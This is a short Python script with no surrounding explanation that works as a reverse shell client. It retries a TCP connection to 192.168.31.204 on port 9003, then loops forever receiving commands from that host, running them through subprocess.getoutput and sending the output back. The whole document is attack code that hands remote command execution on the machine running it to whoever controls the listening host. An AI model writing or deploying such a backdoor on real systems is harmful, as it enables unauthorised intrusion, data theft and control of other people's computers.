import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#ipv4 with tcp

while True:
    try:
        s.connect(('192.168.31.204',9003))
        break
    except ConnectionRefusedError:
        continue
    
    
print('Connected')

while True:
    cmd = s.recv(1024)
    cmd.decode()
    cmdoutput = subprocess.getoutput(cmd=cmd)
    s.send(cmdoutput.encode())
    